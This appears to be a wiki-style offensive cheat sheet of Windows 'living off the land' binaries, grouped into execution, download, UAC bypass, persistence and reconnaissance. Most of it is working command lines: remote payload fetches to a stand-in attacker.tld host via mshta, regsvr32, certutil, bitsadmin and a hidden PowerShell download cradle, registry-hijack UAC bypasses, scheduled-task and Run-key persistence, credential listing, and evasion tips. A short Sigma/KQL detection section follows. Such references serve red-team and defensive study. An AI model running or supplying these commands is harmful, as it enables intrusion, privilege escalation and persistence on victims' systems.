---
title: LOLBAS grouped by technique
slug: lolbas-grouped-techniques
aliases: [lolbas-techniques, lolbins-by-category, lolbas-cheatsheet]
---
{% raw %}

> **TL;DR:** LOLBAS binaries grouped by offensive technique — execution, download, AWL/UAC bypass, persistence, and recon — with the specific command lines, version caveats, and detection signatures for each. This is the working reference; see [[living-off-the-land-binaries-lolbas]] for the conceptual overview and detection engineering approach.

## Execution

Binaries that run arbitrary code (inline, from a file, or from a URL) without dropping a traditional `.exe`.

```cmd
:: mshta — HTA/JScript/VBScript from URL or inline
mshta.exe https://attacker.tld/a.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")

:: cmstp — Connection Manager Profile Installer (INF with COM scriptlet)
:: Requires a crafted .inf file that registers a COM object pointing to a scriptlet
cmstp.exe /ni /s c:\temp\evil.inf

:: regsvr32 — "Squiblydoo" (scrobj.dll loads remote SCT scriptlet)
regsvr32.exe /s /n /u /i:https://attacker.tld/payload.sct scrobj.dll

:: msbuild — inline C# task in a .csproj/.xml file
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

:: installutil — runs [System.ComponentModel.RunInstaller(true)] class
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

:: rundll32 — DLL export or JS protocol trick
rundll32.exe shell32.dll,Control_RunDLL evil.cpl
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('calc')")

:: wmic — process creation (deprecated, removed from Win11 24H2+)
wmic.exe process call create "cmd /c whoami"

:: pcalua — Program Compatibility Assistant launcher
pcalua.exe -a c:\temp\evil.exe

:: forfiles — execute via /c parameter
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\evil.exe"

:: msiexec — install an MSI payload (can be remote)
msiexec /q /i https://attacker.tld/evil.msi
```

**Version notes**: `wmic.exe` is being removed from recent Windows 11 builds. `mshta.exe` is blocked by ASR rule "Block JavaScript or VBScript from launching downloaded executable content" in Defender. `regsvr32 + scrobj.dll` is now in every vendor's default detection set — treat as burn.

## Download / staging

Fetching files to disk or memory using signed, in-box binaries.

```cmd
:: certutil — the classic downloader + base64 decoder
certutil.exe -urlcache -split -f https://attacker.tld/payload.b64 c:\temp\p.b64
certutil.exe -decode c:\temp\p.b64 c:\temp\payload.exe

:: bitsadmin — Background Intelligent Transfer Service
bitsadmin /transfer myJob /priority foreground https://attacker.tld/p.exe c:\temp\p.exe
:: BITS jobs survive reboots — useful for persistence staging

:: powershell — IEX / WebClient (not file-free from a LOLBAS perspective, but in-box)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://attacker.tld/s.ps1')"
powershell -nop -c "Invoke-WebRequest -Uri https://attacker.tld/p.exe -OutFile c:\temp\p.exe"

:: curl.exe — ships in Win10 1803+ / Server 2019+
curl.exe -o c:\temp\p.exe https://attacker.tld/p.exe

:: desktopimgdownldr — BITS via DLL export (older builds)
rundll32.exe "C:\Windows\System32\ieframe.dll",OpenURL c:\temp\url.url

:: esentutl — copy/stream from UNC or WebDAV
esentutl.exe /y \\attacker.tld\share\payload.exe /d c:\temp\payload.exe /o

:: expand — extract from a CAB over UNC
expand \\attacker.tld\share\payload.cab c:\temp\payload.exe

:: finger — can fetch data over finger protocol (exotic, but signed)
finger user@attacker.tld | Out-File c:\temp\payload.b64
```

**Detection**: `certutil -urlcache` and `bitsadmin /transfer` are in every vendor's default signature set. `curl.exe` with a non-Microsoft destination may be more evasive on hosts where it is expected (dev boxes).

## AWL / UAC bypass

Application Whitelisting bypass (AppLocker, WDAC) and User Account Control elevation without a UAC prompt.

```cmd
:: cmstp — UAC bypass via auto-elevated COM interface
:: The .inf triggers a COM object registration that auto-elevates
cmstp.exe /ni /s evil.inf

:: fodhelper — UAC bypass via registry hijack (ms-settings handler)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe
:: fodhelper auto-elevates and checks HKCU for the ms-settings handler → runs cmd.exe elevated

:: sdclt — UAC bypass via app paths registry (similar mechanism)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
sdclt.exe /kickoffelev

:: eventvwr — UAC bypass via mmc.exe registry hijack
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe

:: computerdefaults — UAC bypass (Win10 RS2+, same ms-settings pattern as fodhelper)
```

**Key concept**: UAC bypass binaries are Microsoft-signed and set `autoElevate=true` in their manifest. They check registry locations in HKCU (user-writable) for handler/command paths. Set the handler → launch the binary → it auto-elevates and runs the attacker's command at high integrity. See [[uac-bypass-techniques]] for the full pattern.

## Persistence

Using in-box tools for startup, scheduled execution, and registry-based persistence.

```cmd
:: schtasks — scheduled task (most versatile built-in persistence)
schtasks /create /tn "Updater" /tr "c:\temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "DailySync" /tr "powershell -nop -w hidden -f c:\temp\s.ps1" /sc daily /st 09:00

:: reg — Run/RunOnce keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "c:\temp\payload.exe" /f

:: sc — create a Windows service (requires admin)
sc create EvilSvc binPath= "c:\temp\payload.exe" start= auto

:: bitsadmin — BITS notification command (survives reboots)
bitsadmin /create persist
bitsadmin /addfile persist https://attacker.tld/fake.txt c:\temp\fake.txt
bitsadmin /SetNotifyCmdLine persist c:\temp\payload.exe ""
bitsadmin /resume persist
```

## Reconnaissance / enumeration

In-box binaries for network and domain discovery that blend with normal admin activity.

```cmd
:: nltest — domain trust enumeration
nltest /dclist:DOMAIN
nltest /domain_trusts /all_trusts
nltest /dsgetsite

:: net — user, group, share, session enumeration
net user /domain
net group "Domain Admins" /domain
net share
net session
net localgroup Administrators

:: dsquery — AD object queries (requires RSAT or DC tools)
dsquery user -limit 0
dsquery computer -limit 0
dsquery group -name "Domain Admins"

:: network topology (low noise — normal admin activity)
arp -a & route print & ipconfig /all & netstat -ano

:: systeminfo / tasklist — OS fingerprint + running AV/EDR
systeminfo & tasklist /svc

:: whoami — current context, privileges, group memberships
whoami /all

:: cmdkey — stored RDP/network credentials
cmdkey /list
```

**OPSEC note**: `nltest`, `dsquery`, and `net group "Domain Admins" /domain` are high-signal queries that MDI (Microsoft Defender for Identity) and most SIEMs alert on. Prefer LDAP queries via [[ad-recon-low-noise]] techniques for stealthier enumeration. `tasklist /svc` reveals which AV/EDR products are running.

## Detection strategy

Two high-signal patterns cover most categories:

**Parent-child anomaly** (execution): Office process spawning `mshta.exe`, `regsvr32.exe`, `msbuild.exe`, or `cmstp.exe` — Sigma `sel_exec` on `ParentImage` + `Image`.

**Registry + auto-elevate** (UAC bypass): write to `HKCU\...\ms-settings\Shell\Open\command` followed by `fodhelper.exe` or `computerdefaults.exe` launch — Sysmon event 13 + event 1.

**Download staging** (KQL):

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe","bitsadmin.exe","curl.exe","esentutl.exe")
| where ProcessCommandLine has_any ("urlcache","transfer","http://","https://")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

See [[living-off-the-land-binaries-lolbas]] for full Sigma rules and KQL patterns per binary.

## References

- https://lolbas-project.github.io/ — official project with per-binary YAML entries
- https://github.com/LOLBAS-Project/LOLBAS
- [UACME — hfiref0x/UACME](https://github.com/hfiref0x/UACME) — comprehensive UAC bypass catalogue
- [ired.team — LOLBAS and UAC bypass techniques](https://www.ired.team/) — per-technique walkthroughs
- [MITRE ATT&CK T1218](https://attack.mitre.org/techniques/T1218/) — System Binary Proxy Execution

See also: [[living-off-the-land-binaries-lolbas]], [[uac-bypass-techniques]], [[applocker-bypass-techniques]], [[ad-recon-low-noise]], [[amsi-bypass]], [[dll-side-loading]]
{% endraw %}
